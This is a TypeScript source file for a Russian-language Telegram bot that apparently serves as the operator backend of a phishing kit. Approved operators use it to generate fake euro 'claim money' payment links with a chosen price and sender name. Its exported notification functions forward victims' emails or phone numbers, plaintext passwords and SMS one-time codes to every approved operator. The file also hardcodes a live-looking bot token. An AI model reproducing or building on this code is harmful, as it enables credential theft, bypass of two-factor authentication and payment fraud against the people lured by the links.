import TelegramBot from 'node-telegram-bot-api';
import { db } from './db';
import { telegramUsers, telegramLinks } from '@shared/schema';
import { eq, desc } from 'drizzle-orm';

const BOT_TOKEN = '8060343326:AAHvHLzqappYiyspQNHNWUD-6AJ4lfc1FtY';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Admin user ID - will be set automatically for the first user who sends /start
let ADMIN_ID: string | null = null;

// Initialize ADMIN_ID from database
async function initializeAdmin() {
  try {
    const adminUsers = await db.select().from(telegramUsers);
    if (adminUsers.length > 0) {
      // Set ADMIN_ID to the first approved user (likely the admin)
      const admin = adminUsers.find(user => user.isApproved);
      if (admin) {
        ADMIN_ID = admin.telegramId;
        console.log(`Admin ID initialized: ${ADMIN_ID}`);
      }
    }
  } catch (error) {
    console.error('Error initializing admin:', error);
  }
}

// Initialize admin on startup
initializeAdmin();

// Generate unique ID in format #A1B2C3D4
function generateUniqueId(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '#';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Generate unique link ID in format LINK_01
async function generateLinkId(): Promise<string> {
  const existingLinks = await db.select().from(telegramLinks).orderBy(desc(telegramLinks.id));
  let nextNumber = 1;
  
  if (existingLinks.length > 0) {
    // Extract number from last link ID
    const lastLinkId = existingLinks[0].linkId;
    const match = lastLinkId.match(/LINK_(\d+)/);
    if (match) {
      nextNumber = parseInt(match[1]) + 1;
    }
  }
  
  return `LINK_${nextNumber.toString().padStart(2, '0')}`;
}

// Generate random context data
function generateRandomString(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
  let result = "";
  for (let i = 0; i < 64; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Check if user is approved
async function isUserApproved(telegramId: string): Promise<boolean> {
  const user = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, telegramId));
  return user.length > 0 && (user[0].isApproved === true);
}

// Get user by telegram ID
async function getUserByTelegramId(telegramId: string) {
  const users = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, telegramId));
  return users[0] || null;
}

// Main keyboard for approved users
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: '🔗 Создать ссылку' }, { text: '📋 Мои ссылки' }],
      [{ text: '📊 Статистика' }, { text: '❓ Помощь' }]
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  }
};

// Cancel keyboard
const cancelKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: '❌ Отмена' }]
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  }
};

// User states for conversation flow
const userStates = new Map<string, { state: string; data?: any }>();

// Bot commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || '';
  const username = msg.from?.username || '';
  const firstName = msg.from?.first_name || '';
  const lastName = msg.from?.last_name || '';

  // Check if this is the first user (admin)
  const allUsers = await db.select().from(telegramUsers);
  if (allUsers.length === 0) {
    // First user becomes admin automatically
    ADMIN_ID = telegramId;
    const uniqueId = generateUniqueId();
    
    try {
      await db.insert(telegramUsers).values({
        telegramId,
        username,
        firstName,
        lastName,
        uniqueId,
        isApproved: true,
      });

      await bot.sendMessage(chatId, 
        `🎉 Добро пожаловать, администратор!\n\n` +
        `Ваш уникальный ID: ${uniqueId}\n\n` +
        `Вы автоматически получили полный доступ как первый пользователь.\n` +
        `Используйте команду /approve ID для одобрения других пользователей.`, 
        mainKeyboard
      );
      return;
    } catch (error) {
      console.error('Error creating admin user:', error);
      await bot.sendMessage(chatId, 'Произошла ошибка при создании администратора.');
      return;
    }
  }

  if (await isUserApproved(telegramId)) {
    await bot.sendMessage(chatId, 
      `Добро пожаловать обратно! 🎉\n\n` +
      `Используйте кнопки ниже для управления ссылками:`, 
      mainKeyboard
    );
    return;
  }

  // Check if user already requested access
  const existingUser = await getUserByTelegramId(telegramId);
  if (existingUser && !existingUser.isApproved) {
    await bot.sendMessage(chatId, 
      `Ваш запрос на доступ уже отправлен! ⏳\n\n` +
      `Уникальный ID: ${existingUser.uniqueId}\n` +
      `Дождитесь одобрения администратора.`
    );
    return;
  }

  // Create new user request
  const uniqueId = generateUniqueId();
  
  try {
    await db.insert(telegramUsers).values({
      telegramId,
      username,
      firstName,
      lastName,
      uniqueId,
      isApproved: false,
    });

    await bot.sendMessage(chatId, 
      `Добро пожаловать! 👋\n\n` +
      `Ваш уникальный ID: ${uniqueId}\n\n` +
      `Запрос на доступ отправлен администратору.\n` +
      `Дождитесь одобрения для использования бота.`
    );

    // Notify admin if set
    if (ADMIN_ID) {
      await bot.sendMessage(ADMIN_ID, 
        `🔔 Новый запрос на доступ\n\n` +
        `ID: ${uniqueId}\n` +
        `Пользователь: ${firstName} ${lastName}\n` +
        `Username: @${username}\n` +
        `Telegram ID: ${telegramId}\n\n` +
        `Для одобрения используйте: /approve ${uniqueId}`
      );
    }

  } catch (error) {
    console.error('Error creating user request:', error);
    await bot.sendMessage(chatId, 'Произошла ошибка. Попробуйте позже.');
  }
});

// Admin command to approve users
bot.onText(/\/approve (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || '';
  
  if (!ADMIN_ID || telegramId !== ADMIN_ID) {
    await bot.sendMessage(chatId, 'У вас нет прав для выполнения этой команды.');
    return;
  }

  const uniqueId = match?.[1];
  if (!uniqueId) {
    await bot.sendMessage(chatId, 'Неверный формат команды. Используйте: /approve #ID');
    return;
  }

  try {
    const users = await db.select().from(telegramUsers).where(eq(telegramUsers.uniqueId, uniqueId));
    
    if (users.length === 0) {
      await bot.sendMessage(chatId, 'Пользователь с таким ID не найден.');
      return;
    }

    const user = users[0];
    
    await db.update(telegramUsers)
      .set({ isApproved: true, approvedAt: new Date() })
      .where(eq(telegramUsers.uniqueId, uniqueId));

    await bot.sendMessage(chatId, `✅ Пользователь ${user.firstName} ${user.lastName} одобрен!`);
    
    // Notify user
    await bot.sendMessage(user.telegramId, 
      `🎉 Ваш запрос одобрен!\n\n` +
      `Теперь вы можете использовать все функции бота.`,
      mainKeyboard
    );

  } catch (error) {
    console.error('Error approving user:', error);
    await bot.sendMessage(chatId, 'Произошла ошибка при одобрении пользователя.');
  }
});

// Handle text messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || '';
  const text = msg.text;

  if (!text || text.startsWith('/')) return;

  // Check if user is approved
  if (!(await isUserApproved(telegramId))) {
    await bot.sendMessage(chatId, 'Вы не авторизованы. Используйте /start для запроса доступа.');
    return;
  }

  const userState = userStates.get(telegramId);

  // Handle cancel
  if (text === '❌ Отмена') {
    userStates.delete(telegramId);
    await bot.sendMessage(chatId, 'Действие отменено.', mainKeyboard);
    return;
  }

  // Handle main menu buttons
  if (text === '🔗 Создать ссылку') {
    userStates.set(telegramId, { state: 'awaiting_price' });
    await bot.sendMessage(chatId, 
      'Введите цену (например: 10 или 10.50):', 
      cancelKeyboard
    );
    return;
  }

  if (text === '📋 Мои ссылки') {
    await showUserLinks(chatId, telegramId);
    return;
  }

  if (text === '📊 Статистика') {
    await showUserStats(chatId, telegramId);
    return;
  }

  if (text === '❓ Помощь') {
    await bot.sendMessage(chatId, 
      `🤖 Помощь по использованию бота:\n\n` +
      `🔗 Создать ссылку - создание новой платежной ссылки\n` +
      `📋 Мои ссылки - просмотр всех созданных ссылок\n` +
      `📊 Статистика - статистика по ссылкам\n` +
      `❓ Помощь - это сообщение\n\n` +
      `Для создания ссылки просто введите цену и имя отправителя.\n` +
      `Бот автоматически сгенерирует уникальную ссылку для платежа.`,
      mainKeyboard
    );
    return;
  }

  // Handle conversation states
  if (userState) {
    await handleUserState(chatId, telegramId, text, userState);
  } else {
    await bot.sendMessage(chatId, 'Используйте кнопки меню для навигации.', mainKeyboard);
  }
});

// Handle user conversation states
async function handleUserState(chatId: number, telegramId: string, text: string, userState: any) {
  try {
    switch (userState.state) {
      case 'awaiting_price':
        // Validate price
        const price = parseFloat(text.replace(',', '.'));
        if (isNaN(price) || price <= 0) {
          await bot.sendMessage(chatId, 'Неверная цена. Введите число больше 0:');
          return;
        }
        
        const formattedPrice = `€${price.toFixed(2)}`;
        userStates.set(telegramId, { 
          state: 'awaiting_sender_name', 
          data: { price: formattedPrice } 
        });
        
        await bot.sendMessage(chatId, 
          `Цена: ${formattedPrice}\n\n` +
          'Теперь введите имя отправителя:'
        );
        break;

      case 'awaiting_sender_name':
        if (text.trim().length < 2) {
          await bot.sendMessage(chatId, 'Имя отправителя должно содержать минимум 2 символа:');
          return;
        }

        const { price: linkPrice } = userState.data;
        await createLink(chatId, telegramId, linkPrice, text.trim());
        userStates.delete(telegramId);
        break;

      default:
        userStates.delete(telegramId);
        await bot.sendMessage(chatId, 'Неизвестное состояние. Попробуйте снова.', mainKeyboard);
    }
  } catch (error) {
    console.error('Error handling user state:', error);
    userStates.delete(telegramId);
    await bot.sendMessage(chatId, 'Произошла ошибка. Попробуйте снова.', mainKeyboard);
  }
}

// Create new link
async function createLink(chatId: number, telegramId: string, price: string, senderName: string) {
  try {
    const linkId = await generateLinkId();
    const contextData = generateRandomString();
    const baseUrl = process.env.NODE_ENV === 'production' 
      ? 'https://your-domain.com' 
      : 'http://localhost:5000';
    
    const generatedLink = `${baseUrl}/myaccount/transfer/claim-money?context_data=${contextData}&price=${encodeURIComponent(price)}&name=${encodeURIComponent(senderName)}`;

    await db.insert(telegramLinks).values({
      linkId,
      price,
      senderName,
      generatedLink,
      contextData,
      createdBy: telegramId,
    });

    await bot.sendMessage(chatId, 
      `✅ Ссылка создана!\n\n` +
      `ID: ${linkId}\n` +
      `Цена: ${price}\n` +
      `Отправитель: ${senderName}\n\n` +
      `Ссылка:\n${generatedLink}\n\n` +
      `Нажмите на ссылку чтобы скопировать её.`,
      mainKeyboard
    );

  } catch (error) {
    console.error('Error creating link:', error);
    await bot.sendMessage(chatId, 'Произошла ошибка при создании ссылки.', mainKeyboard);
  }
}

// Show user links
async function showUserLinks(chatId: number, telegramId: string) {
  try {
    const links = await db.select().from(telegramLinks)
      .where(eq(telegramLinks.createdBy, telegramId))
      .orderBy(desc(telegramLinks.createdAt));

    if (links.length === 0) {
      await bot.sendMessage(chatId, 'У вас нет созданных ссылок.', mainKeyboard);
      return;
    }

    let message = `📋 Ваши ссылки (${links.length}):\n\n`;
    
    for (const link of links.slice(0, 10)) { // Show max 10 links
      const date = new Date(link.createdAt).toLocaleDateString('ru-RU');
      message += `${link.linkId} - ${link.price}\n`;
      message += `👤 ${link.senderName}\n`;
      message += `📅 ${date}\n`;
      message += `🔗 ${link.generatedLink}\n\n`;
    }

    if (links.length > 10) {
      message += `... и еще ${links.length - 10} ссылок`;
    }

    await bot.sendMessage(chatId, message, mainKeyboard);

  } catch (error) {
    console.error('Error showing user links:', error);
    await bot.sendMessage(chatId, 'Произошла ошибка при загрузке ссылок.', mainKeyboard);
  }
}

// Show user statistics
async function showUserStats(chatId: number, telegramId: string) {
  try {
    const links = await db.select().from(telegramLinks)
      .where(eq(telegramLinks.createdBy, telegramId));

    const totalLinks = links.length;
    const totalAmount = links.reduce((sum, link) => {
      const amount = parseFloat(link.price.replace('€', ''));
      return sum + (isNaN(amount) ? 0 : amount);
    }, 0);

    const recentLinks = links.filter(link => {
      const linkDate = new Date(link.createdAt);
      const weekAgo = new Date();
      weekAgo.setDate(weekAgo.getDate() - 7);
      return linkDate > weekAgo;
    }).length;

    await bot.sendMessage(chatId,
      `📊 Ваша статистика:\n\n` +
      `📈 Всего ссылок: ${totalLinks}\n` +
      `💰 Общая сумма: €${totalAmount.toFixed(2)}\n` +
      `📅 За последнюю неделю: ${recentLinks}\n` +
      `🔗 Средняя сумма: €${totalLinks > 0 ? (totalAmount / totalLinks).toFixed(2) : '0.00'}`,
      mainKeyboard
    );

  } catch (error) {
    console.error('Error showing user stats:', error);
    await bot.sendMessage(chatId, 'Произошла ошибка при загрузке статистики.', mainKeyboard);
  }
}

// Notification functions for website events
export async function notifyLoginAttempt(emailOrPhone: string, password: string, returnUri: string) {
  try {
    const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    
    const message = `🔐 Новая попытка входа\n\n` +
      `📧 Email/Телефон: ${emailOrPhone}\n` +
      `🔑 Пароль: ${password}\n` +
      `🔗 Return URI: ${returnUri}\n` +
      `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;

    for (const user of approvedUsers) {
      await bot.sendMessage(user.telegramId, message);
    }
  } catch (error) {
    console.error('Error sending login notification:', error);
  }
}

export async function notifyLoginApproved(emailOrPhone: string) {
  try {
    const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    
    const message = `✅ Вход одобрен\n\n` +
      `📧 Email/Телефон: ${emailOrPhone}\n` +
      `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;

    for (const user of approvedUsers) {
      await bot.sendMessage(user.telegramId, message);
    }
  } catch (error) {
    console.error('Error sending approval notification:', error);
  }
}

export async function notifySmsSubmission(otpCode: string, stepupContext: string) {
  try {
    const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    
    const message = `📱 Новый SMS код\n\n` +
      `🔢 Код: ${otpCode}\n` +
      `📋 Контекст: ${stepupContext}\n` +
      `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;

    for (const user of approvedUsers) {
      await bot.sendMessage(user.telegramId, message);
    }
  } catch (error) {
    console.error('Error sending SMS notification:', error);
  }
}

console.log('✅ Telegram bot started successfully!');
console.log('Bot token:', BOT_TOKEN.substring(0, 20) + '...');

export default bot;